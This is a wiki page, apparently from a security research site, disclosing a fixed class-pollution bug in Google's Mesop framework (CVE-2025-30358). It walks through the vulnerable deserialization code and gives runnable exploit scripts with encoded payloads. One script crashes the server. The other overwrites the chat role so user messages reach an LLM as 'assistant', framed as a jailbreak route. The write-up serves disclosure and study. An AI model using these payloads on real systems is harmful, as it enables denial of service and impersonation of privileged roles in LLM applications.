@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mesop | Python Class Pollution</title>
+    <link rel="stylesheet" href="/wiki/css/wiki.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <div class="wiki-layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/wiki/docs/">Class Pollution Wiki</a>
+            </div>
+            <ul class="sidebar-nav">
+
+
+    <li>
+        <a href="/wiki/docs/" >Overview</a>
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/taxonomy/atomics/" >Get &amp; Set Atomics</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/targets/" >Pollution Targets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/targets/classes/" >Classes</a></li>
+            
+            <li><a href="/wiki/docs/targets/modules/" >Modules</a></li>
+            
+            <li><a href="/wiki/docs/targets/functions/" >Functions</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/gadgets/" >Gadgets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/gadgets/rce/" >RCE Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/tool/" >Tool</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/tool/pyrl/" >Pyrl</a></li>
+            
+            <li><a href="/wiki/docs/tool/polluter/" >Polluter</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/collection/" >Showcases &amp; CVEs</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/collection/catalog/" >Catalog</a></li>
+            
+            <li><a href="/wiki/docs/collection/showcases/" >Showcase Walkthroughs</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/defense/" >Defense</a>
+        
+    </li>
+    
+
+</ul>
+
+        </nav>
+        <main class="content">
+            
+<article>
+    <h1 id="mesop-cve-2025-30358">Mesop (CVE-2025-30358)</h1>
+<p><strong>Mesop</strong> is Google&rsquo;s Python-based UI framework for building web applications (5.7K stars), designed for rapid prototyping of ML demos and internal tools.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Repository</td>
+          <td><a href="https://github.com/google/mesop">google/mesop</a></td>
+      </tr>
+      <tr>
+          <td>Version</td>
+          <td>v0.13.0</td>
+      </tr>
+      <tr>
+          <td>CVE</td>
+          <td>CVE-2025-30358</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Constrained-Get × Dual-Set</td>
+      </tr>
+      <tr>
+          <td>Input</td>
+          <td>Remote (Protobuf over HTTP)</td>
+      </tr>
+      <tr>
+          <td>Consequences</td>
+          <td>DoS, LLM Jailbreak (Identity Confusion)</td>
+      </tr>
+      <tr>
+          <td>Status</td>
+          <td>Fixed</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="summary">Summary</h2>
+<p>We identified a class pollution vulnerability in Mesop that allows attackers to overwrite global variables and class attributes in certain Mesop modules during runtime. This vulnerability could directly lead to a denial of service (DoS) attack against the server. Additionally, it could result in other severe consequences given the application&rsquo;s implementation, such as identity confusion, where an attacker could impersonate an assistant or system role within conversations — potentially enabling jailbreak attacks when interacting with large language models (LLMs).</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Mesop enables client-server communication using messages serialized with the Protobuf protocol. When a client&rsquo;s state changes (e.g., user input), the server updates the user&rsquo;s state using the <code>update_dataclass_from_json</code> function. The <code>instance</code> argument is a <code>State</code> object, and the <code>json_string</code> argument is parsed from client requests.</p>
+<p><a href="https://github.com/google/mesop/blob/cbab8bf0683560245d11f96581d6338b0103acc4/mesop/dataclass_utils/dataclass_utils.py#L125"><code>mesop/dataclass_utils/dataclass_utils.py</code></a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_dataclass_from_json</span>(instance: Any, json_string: str):
+</span></span><span style="display:flex;"><span>  data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(json_string, object_hook<span style="color:#f92672">=</span>decode_mesop_json_state_hook)
+</span></span><span style="display:flex;"><span>  _recursive_update_dataclass_from_json_obj(instance, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_recursive_update_dataclass_from_json_obj</span>(instance: Any, json_dict: Any):
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> json_dict<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> hasattr(instance, key):
+</span></span><span style="display:flex;"><span>      attr <span style="color:#f92672">=</span> getattr(instance, key)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> isinstance(value, dict):
+</span></span><span style="display:flex;"><span>        setattr(
+</span></span><span style="display:flex;"><span>          instance,
+</span></span><span style="display:flex;"><span>          key,
+</span></span><span style="display:flex;"><span>          _recursive_update_dataclass_from_json_obj(attr, value),
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">elif</span> isinstance(value, list):
+</span></span><span style="display:flex;"><span>        updated_list: list[Any] <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> item <span style="color:#f92672">in</span> cast(list[Any], value):
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> isinstance(item, dict):
+</span></span><span style="display:flex;"><span>            attr <span style="color:#f92672">=</span> getattr(instance, key)
+</span></span><span style="display:flex;"><span>            item_instance <span style="color:#f92672">=</span> instance<span style="color:#f92672">.</span>__annotations__[key]<span style="color:#f92672">.</span>__args__[<span style="color:#ae81ff">0</span>]()
+</span></span><span style="display:flex;"><span>            updated_list<span style="color:#f92672">.</span>append(
+</span></span><span style="display:flex;"><span>              _recursive_update_dataclass_from_json_obj(item_instance, item)
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            updated_list<span style="color:#f92672">.</span>append(item)
+</span></span><span style="display:flex;"><span>        setattr(instance, key, updated_list)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        setattr(instance, key, value)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> isinstance(instance, dict):
+</span></span><span style="display:flex;"><span>        instance[key] <span style="color:#f92672">=</span> value
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> MesopException(
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Unhandled stateclass deserialization where key=</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">, value=</span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">, instance=</span><span style="color:#e6db74">{</span>instance<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> instance
+</span></span></code></pre></div><p>The function:</p>
+<ol>
+<li>Iterates over attacker-controlled JSON keys</li>
+<li>Checks <code>hasattr(instance, key)</code> — this succeeds for dunder attributes like <code>__class__</code></li>
+<li>Resolves via <code>getattr(instance, key)</code> (Constrained-Get)</li>
+<li>Sets via <code>setattr</code> or <code>instance[key] = value</code> (Dual-Set)</li>
+</ol>
+<p>No validation is performed on the attribute path.</p>
+<h3 id="triggering-the-vulnerable-function">Triggering the Vulnerable Function</h3>
+<p>A direct PoC to trigger the class pollution:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> mesop.dataclass_utils.dataclass_utils <span style="color:#f92672">import</span> update_dataclass_from_json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> dataclasses <span style="color:#f92672">import</span> dataclass
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@dataclass</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">State</span>:
+</span></span><span style="display:flex;"><span>  input: str
+</span></span><span style="display:flex;"><span>  output: str
+</span></span><span style="display:flex;"><span>  textarea_key: int
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>obj <span style="color:#f92672">=</span> State(<span style="color:#e6db74">&#39;HELLO&#39;</span>, <span style="color:#e6db74">&#39;WORLD&#39;</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>  update_dataclass_from_json(obj, <span style="color:#e6db74">&#39;{&#34;__init__&#34;: {&#34;__globals__&#34;: {&#34;__name__&#34;: &#34;polluted&#34;}}}&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(__name__)  <span style="color:#75715e"># polluted</span>
+</span></span></code></pre></div><h2 id="poc">PoC</h2>
+<h3 id="consequence-1-dos">Consequence 1: DoS</h3>
+<p><a href="https://drive.google.com/file/d/1BESvtyaJyEOp0BkeFdZFdwj83_E9wp18/view">Video PoC</a></p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Install Mesop following the <a href="https://google.github.io/mesop/getting-started/installing/">installation guide</a>.</li>
+<li>Launch the Chat app locally: <code>mesop chat.py</code>, where <code>chat.py</code> is from the <a href="https://google.github.io/mesop/components/chat/">official Mesop documentation</a>.</li>
+<li>Run the following exploit script, which sends a class-polluting message to the server:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:32123/__ui__&#34;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Host&#34;</span>: <span style="color:#e6db74">&#34;localhost:32123&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;*/*&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:32123&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:32123/chat&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload: {&#34;__class__&#34;: {&#34;__init__&#34;: {&#34;__globals__&#34;: {&#34;time&#34;: &#34;polluted&#34;}}}}</span>
+</span></span><span style="display:flex;"><span>body <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;GgUvY2hhdBK8AQqqAQpECkJ7Il9fY2xhc3NfXyI6IHsiX19pbml0X18iOiB7Il9fZ2xvYmFsc19fIjog&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;eyJ0aW1lIjogInBvbGx1dGVkIn19fX0KMAoueyJpbnB1dCI6ICIiLCAib3V0cHV0IjogIiIsICJ0ZXh0&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;YXJlYV9rZXkiOiAwfQowCi57ImlucHV0IjogIiIsICJvdXRwdXQiOiAiIiwgInRleHRhcmVhX2tleSI6&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;IDB9WgUInwoQfWoECAAQAFIA&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>body)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Status Code: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><ol start="4">
+<li>Open the Chat application at <code>http://localhost:32123/chat</code> and attempt to input any message.</li>
+</ol>
+<p><strong>Effect</strong>: The imported <code>time</code> module in the <code>mesop.labs.chat</code> module has been overwritten with the string <code>&quot;polluted&quot;</code>. The server continuously raises errors on any subsequent request, making the application completely unusable until restarted.</p>
+<hr>
+<h3 id="consequence-2-llm-jailbreak-identity-confusion">Consequence 2: LLM Jailbreak (Identity Confusion)</h3>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Install Mesop and launch the Chat application locally.</li>
+<li>Run the following exploit script:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:32123/__ui__&#34;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Host&#34;</span>: <span style="color:#e6db74">&#34;localhost:32123&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;*/*&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:32123&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:32123/chat&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload: {&#34;__class__&#34;: {&#34;__init__&#34;: {&#34;__globals__&#34;: {&#34;_ROLE_USER&#34;: &#34;assistant&#34;}}}}</span>
+</span></span><span style="display:flex;"><span>body <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;GgUvY2hhdBKsAgqxAQpLCkl7Il9fY2xhc3NfXyI6IHsiX19pbml0X18iOiB7Il9fZ2xvYmFsc19fIjog&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;eyJfUk9MRV9VU0VSIjogImFzc2lzdGFudCJ9fX19CjAKLnsiaW5wdXQiOiAiIiwgIm91dHB1dCI6ICIi&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;LCAidGV4dGFyZWFfa2V5IjogMH0KMAoueyJpbnB1dCI6ICIiLCAib3V0cHV0IjogIiIsICJ0ZXh0YXJl&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;YV9rZXkiOiAwfRJYbWVzb3AubGFicy5jaGF0Lm9uX2JsdXIuNzQ0NDBlMzE0NGNkZjUyMzgwNjE3OWI2&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;NjcxZTMwMmQ1ZDk5YzNmNjM2NzM3OTUxMDc2ZTJmNzAyZWI2NDI2ZRoJCgdpbnB1dC0wWgYInwoQ7gFq&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;BAgAEAAqA2FzZA&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>body)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Status Code: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><ol start="3">
+<li>Open the browser and interact with the chatbot. Observe that the user&rsquo;s messages are now sent with the <code>assistant</code> role.</li>
+</ol>
+<p><strong>Effect</strong>: The global variable <code>_ROLE_USER</code> in the <code>mesop.labs.chat</code> module is overwritten from <code>&quot;user&quot;</code> to <code>&quot;assistant&quot;</code>. In applications integrating LLMs with system prompts, this allows the attacker to impersonate roles like system or administrator, facilitating jailbreak attacks by sending messages to the LLM with elevated privileges.</p>
+<h2 id="impact">Impact</h2>
+<p>Any user of a Mesop application can exploit this vulnerability to launch DoS attacks and, depending on the application&rsquo;s implementation, achieve identity confusion or other severe consequences. The HTTP endpoint is accessible to any user, making this a remote-triggerable vulnerability. Google promptly patched the issue after responsible disclosure.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p><a href="https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/mesop/poc"><code>cp-collection/mesop/poc/</code></a>
+— runnable exploit environment with <code>run.sh</code> and <code>requirements.txt</code>.</p>
+
+</article>
+
+        </main>
+    </div>
+</body>
+</html>
